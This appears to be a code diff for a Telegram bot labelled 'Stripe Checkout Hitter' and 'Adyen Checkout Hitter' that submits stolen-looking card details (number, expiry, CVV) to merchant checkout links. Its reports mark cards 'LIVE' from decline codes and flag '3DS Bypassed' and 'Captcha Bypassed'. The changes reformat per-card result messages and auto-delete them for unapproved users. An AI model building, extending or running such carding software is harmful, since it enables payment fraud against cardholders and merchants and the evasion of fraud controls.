@@ -173,18 +173,23 @@ async def approve_command(message: types.Message):
     except Exception as e:
         print(f"Failed to send peer notification to approved user: {e}")
 
-def extract_site_domain(url_str: str) -> str:
-    """Extract clean domain name (e.g. www.topuplive.com or topuplive.com) from URL."""
+def extract_clean_site_domain(merchant: str, url_str: str) -> str:
+    """Extracts clean site domain e.g. www.openart.ai or manus.ai."""
     if not url_str:
         return ""
     if not url_str.startswith("http://") and not url_str.startswith("https://"):
         url_str = "https://" + url_str
     try:
-        parsed = urllib.parse.urlparse(url_str)
-        domain = parsed.netloc.split(":")[0]
+        domain = urllib.parse.urlparse(url_str).netloc.split(":")[0]
+        # If domain is a gateway checkout domain (stripe checkout / adyen link), infer domain from merchant name
+        if domain in ('checkout.stripe.com', 'invoice.stripe.com', 'pay.stripe.com', 'eu.adyen.link', 'adyen.link', 'test.adyen.link'):
+            clean_m = re.sub(r'[^\w\s]', '', merchant or '').strip().lower().replace(' ', '')
+            if clean_m and clean_m not in ('unknown', 'stripemerchant', 'adyenmerchant'):
+                return f"www.{clean_m}.com" if not clean_m.endswith('.com') else clean_m
+            return domain
         return domain
     except Exception:
-        return url_str
+        return ""
 
 def is_session_expired_err(res: dict) -> bool:
     """Check if response indicates a single-use / pay by link session exhaustion."""
@@ -286,11 +291,10 @@ async def hit_command(message: types.Message):
     card_blocks = []
     merchant_name = "Stripe Merchant"
     amount_str = None
-    site_domain = extract_site_domain(url)
     
     # Callback to update the Telegram message
     async def update_status(data):
-        nonlocal merchant_name, amount_str, site_domain
+        nonlocal merchant_name, amount_str
             
         if data["status"] == "analyzing":
             try: await status_msg.edit_text("cooking....")
@@ -300,15 +304,17 @@ async def hit_command(message: types.Message):
             merchant_name = info.get("merchant") or merchant_name
             raw_amt = info.get("amount")
             if isinstance(raw_amt, int) or (isinstance(raw_amt, str) and raw_amt.isdigit()):
-                amount_str = f"${int(raw_amt)/100:.2f}"
+                amount_str = f"USD {int(raw_amt)/100:.2f}"
             elif raw_amt:
                 amount_str = str(raw_amt)
             
+            site_domain = extract_clean_site_domain(merchant_name, url)
             site_line = f"Site: {html.escape(merchant_name)} ({html.escape(site_domain)})" if site_domain else f"Site: {html.escape(merchant_name)}"
             amt_line = f"\nAmount: {html.escape(amount_str)}" if amount_str else ""
             msg_text = f"<b>Stripe Checkout Hitter</b>\n\n<i>cooking....</i>\n\n{site_line}{amt_line}"
-            try: await status_msg.edit_text(msg_text, disable_web_page_preview=True)
-            except Exception: pass
+            if len(cards) > 1:
+                try: await status_msg.edit_text(msg_text, disable_web_page_preview=True)
+                except Exception: pass
             
         elif data["status"] == "progress":
             res = data["result"]
@@ -336,48 +342,95 @@ async def hit_command(message: types.Message):
             
             amt = res.get('amount')
             if isinstance(amt, int) or (isinstance(amt, str) and amt.isdigit()):
-                amount_str = f"${int(amt)/100:.2f}"
+                amount_str = f"USD {int(amt)/100:.2f}"
             elif amt:
                 amount_str = str(amt)
                 
             merchant_name = res.get('merchant') or merchant_name
+            site_domain = extract_clean_site_domain(merchant_name, url)
+            is_approved = user_id in approved_users_set
 
-            status_str = "Payment Successful ✅" if res['success'] else "Payment Failed ❌"
-            
-            if res['success']:
-                resp_str = "Succeeded"
-                if res.get('3ds_bypassed'):
-                    resp_str += " (3DS Bypassed)"
-                elif res.get('captcha_bypassed'):
-                    resp_str += " (Captcha Bypassed)"
+            if len(cards) == 1:
+                if status_msg:
+                    try: await status_msg.delete()
+                    except: pass
+
+                merchant_disp = f"{html.escape(merchant_name)} ({html.escape(site_domain)})" if site_domain else html.escape(merchant_name)
+                note_line = "" if is_approved else "\n\n<i>Note: this message will be deleted automatically after 30sec</i>"
+                amt_val = amount_str or "USD 0.00"
+
+                if res['success']:
+                    tds_line = "\n🔓 3DS: <b>BYPASSED [STRIPE]</b> (3DS2 → Succeeded)" if res.get('3ds_bypassed') else ""
+                    cpt_line = "\n🤖 Captcha: <b>BYPASSED [STRIPE]</b>" if res.get('captcha_bypassed') else ""
+                    hit_text = (
+                        f"✅ <b>PAYMENT SUCCESSFUL [STRIPE]</b>\n"
+                        f"💳 <code>{card_str}</code>\n"
+                        f"💰 Amount: {amt_val}\n"
+                        f"🛒 Merchant: {merchant_disp}\n"
+                        f"⏱ {res['response_time']:.2f}s"
+                        f"{tds_line}"
+                        f"{cpt_line}" + note_line
+                    )
+                else:
+                    code_raw = str(res.get('decline_code') or res.get('error') or 'unknown').lower()
+                    live_codes = ['insufficient_funds', 'incorrect_cvv', 'invalid_cvc', 'invalid_pin', 'withdrawal_count_limit_exceeded', 'card_velocity_exceeded', 'authentication_required', 'challenge_required', '3d_secure']
+                    is_live = any(c in code_raw for c in live_codes)
+                    status_title = "🟢 <b>CARD LIVE [STRIPE]</b>" if is_live else "❌ <b>PAYMENT UNSUCCESSFUL</b>"
+                    reason_msg = html.escape(str(res.get('error') or code_raw)[:250])
+
+                    hit_text = (
+                        f"{status_title}\n"
+                        f"💳 <code>{card_str}</code>\n"
+                        f"💰 Amount: {amt_val}\n"
+                        f"🛒 Merchant: {merchant_disp}\n"
+                        f"📉 Reason: {reason_msg}\n"
+                        f"⏱ {res['response_time']:.2f}s" + note_line
+                    )
+
+                sent_msg = await message.reply(hit_text, disable_web_page_preview=True)
+                if not is_approved:
+                    async def auto_del_single(m):
+                        await asyncio.sleep(30)
+                        try: await m.delete()
+                        except: pass
+                    asyncio.create_task(auto_del_single(sent_msg))
             else:
-                resp_str = res.get('error') or res.get('decline_code') or "Card declined"
+                status_str = "Payment Successful ✅" if res['success'] else "Payment Failed ❌"
+                
+                if res['success']:
+                    resp_str = "Succeeded"
+                    if res.get('3ds_bypassed'):
+                        resp_str += " (3DS Bypassed)"
+                    elif res.get('captcha_bypassed'):
+                        resp_str += " (Captcha Bypassed)"
+                else:
+                    resp_str = res.get('error') or res.get('decline_code') or "Card declined"
 
-            block = f"CC: <code>{card_str}</code>\nStatus: {status_str}\nResponse: {html.escape(str(resp_str))}"
-            if is_session_expired_err(res):
-                block += "\n⚠️ <i>[Session Expired — Batch Halted]</i>"
+                block = f"CC: <code>{card_str}</code>\nStatus: {status_str}\nResponse: {html.escape(str(resp_str))}"
+                if is_session_expired_err(res):
+                    block += "\n⚠️ <i>[Session Expired — Batch Halted]</i>"
 
-            card_blocks.append(block)
+                card_blocks.append(block)
 
-            site_line = f"Site: {html.escape(merchant_name)} ({html.escape(site_domain)})" if site_domain else f"Site: {html.escape(merchant_name)}"
-            amt_line = f"\nAmount: {html.escape(amount_str)}" if amount_str else ""
-            blocks_text = "\n\n".join(card_blocks)
+                site_line = f"Site: {html.escape(merchant_name)} ({html.escape(site_domain)})" if site_domain else f"Site: {html.escape(merchant_name)}"
+                amt_line = f"\nAmount: {html.escape(amount_str)}" if amount_str else ""
+                blocks_text = "\n\n".join(card_blocks)
 
-            msg_text = (
-                f"<b>Stripe Checkout Hitter</b>\n\n"
-                f"{blocks_text}\n\n"
-                f"{site_line}"
-                f"{amt_line}"
-            )
+                msg_text = (
+                    f"<b>Stripe Checkout Hitter</b>\n\n"
+                    f"{blocks_text}\n\n"
+                    f"{site_line}"
+                    f"{amt_line}"
+                )
 
-            try:
-                await status_msg.edit_text(msg_text, disable_web_page_preview=True)
-            except Exception:
-                pass
+                try:
+                    await status_msg.edit_text(msg_text, disable_web_page_preview=True)
+                except Exception:
+                    pass
                 
         elif data["status"] in ("completed", "error"):
             is_approved = user_id in approved_users_set
-            if not is_approved and status_msg:
+            if not is_approved and status_msg and len(cards) > 1:
                 async def auto_del_stripe(m):
                     await asyncio.sleep(30)
                     try: await m.delete()
@@ -441,56 +494,100 @@ async def hitad_command(message: types.Message):
         card_blocks = []
         merchant_name = "Adyen Merchant"
         amount_str = None
-        site_domain = extract_site_domain(url)
+        results = []
 
         for idx, card in enumerate(cards, 1):
             if user_id not in active_sessions:
                 break
             res = await adyen_engine.hit(card, idx, user_id)
+            results.append(res)
             
             card_str = f"{res['card']['card']}|{res['card']['month']}|{res['card']['year']}|{res['card']['cvv']}"
             merchant_name = res.get('merchant') or merchant_name
             if res.get('amount'):
                 amount_str = res['amount']
 
-            status_str = "Payment Successful ✅" if res['success'] else "Payment Failed ❌"
-            
-            if res['success']:
-                resp_str = "Authorised"
-                if res.get('3ds_resolved') or res.get('3ds_bypassed'):
-                    resp_str += " (3DS Bypassed)"
-            else:
-                resp_str = res.get('error') or res.get('decline_code') or "Refused"
+            site_domain = extract_clean_site_domain(merchant_name, url)
 
-            block = f"CC: <code>{card_str}</code>\nStatus: {status_str}\nResponse: {html.escape(resp_str)}"
-            
-            expired = is_session_expired_err(res)
-            if expired:
-                block += "\n⚠️ <i>[Session Expired — Batch Halted]</i>"
+            if len(cards) > 1:
+                status_str = "Payment Successful ✅" if res['success'] else "Payment Failed ❌"
+                
+                if res['success']:
+                    resp_str = "Authorised"
+                    if res.get('3ds_resolved') or res.get('3ds_bypassed'):
+                        resp_str += " (3DS Bypassed)"
+                else:
+                    resp_str = res.get('error') or res.get('decline_code') or "Refused"
 
-            card_blocks.append(block)
+                block = f"CC: <code>{card_str}</code>\nStatus: {status_str}\nResponse: {html.escape(resp_str)}"
+                
+                expired = is_session_expired_err(res)
+                if expired:
+                    block += "\n⚠️ <i>[Session Expired — Batch Halted]</i>"
 
-            site_line = f"Site: {html.escape(merchant_name)} ({html.escape(site_domain)})" if site_domain else f"Site: {html.escape(merchant_name)}"
-            amt_line = f"\nAmount: {html.escape(amount_str)}" if amount_str else ""
-            blocks_text = "\n\n".join(card_blocks)
+                card_blocks.append(block)
 
-            msg_text = (
-                f"<b>Adyen Checkout Hitter</b>\n\n"
-                f"{blocks_text}\n\n"
-                f"{site_line}"
-                f"{amt_line}"
-            )
+                site_line = f"Site: {html.escape(merchant_name)} ({html.escape(site_domain)})" if site_domain else f"Site: {html.escape(merchant_name)}"
+                amt_line = f"\nAmount: {html.escape(amount_str)}" if amount_str else ""
+                blocks_text = "\n\n".join(card_blocks)
 
-            try:
-                await status_msg.edit_text(msg_text, disable_web_page_preview=True)
-            except Exception:
-                pass
+                msg_text = (
+                    f"<b>Adyen Checkout Hitter</b>\n\n"
+                    f"{blocks_text}\n\n"
+                    f"{site_line}"
+                    f"{amt_line}"
+                )
 
-            if expired:
-                break
+                try:
+                    await status_msg.edit_text(msg_text, disable_web_page_preview=True)
+                except Exception:
+                    pass
+
+                if expired:
+                    break
 
         is_approved = user_id in approved_users_set
-        if not is_approved and status_msg:
+
+        if len(cards) == 1 and results:
+            if status_msg:
+                try: await status_msg.delete()
+                except: pass
+
+            res = results[0]
+            card_str = f"{res['card']['card']}|{res['card']['month']}|{res['card']['year']}|{res['card']['cvv']}"
+            merchant_name = res.get('merchant') or merchant_name
+            amount_val = res.get('amount') or amount_str or "USD 0.00"
+            site_domain = extract_clean_site_domain(merchant_name, url)
+            merchant_disp = f"{html.escape(merchant_name)} ({html.escape(site_domain)})" if site_domain else html.escape(merchant_name)
+            note_line = "" if is_approved else "\n\n<i>Note: this message will be deleted automatically after 30sec</i>"
+
+            if res.get('success'):
+                hit_text = (
+                    f"✅ <b>PAYMENT SUCCESSFUL [ADYEN]</b>\n"
+                    f"💳 <code>{card_str}</code>\n"
+                    f"💰 Amount: {amount_val}\n"
+                    f"🛒 Merchant: {merchant_disp}\n"
+                    f"⏱ {res.get('response_time', 0):.2f}s" + note_line
+                )
+            else:
+                reason_msg = html.escape(str(res.get('error') or res.get('decline_code') or 'refused')[:250])
+                hit_text = (
+                    f"❌ <b>PAYMENT UNSUCCESSFUL</b>\n"
+                    f"💳 <code>{card_str}</code>\n"
+                    f"💰 Amount: {amount_val}\n"
+                    f"🛒 Merchant: {merchant_disp}\n"
+                    f"📉 Reason: {reason_msg}\n"
+                    f"⏱ {res.get('response_time', 0):.2f}s" + note_line
+                )
+
+            sent_msg = await message.reply(hit_text, disable_web_page_preview=True)
+            if not is_approved:
+                async def auto_del_ad(m):
+                    await asyncio.sleep(30)
+                    try: await m.delete()
+                    except: pass
+                asyncio.create_task(auto_del_ad(sent_msg))
+        elif len(cards) > 1 and not is_approved and status_msg:
             async def auto_del_ad(m):
                 await asyncio.sleep(30)
                 try: await m.delete()
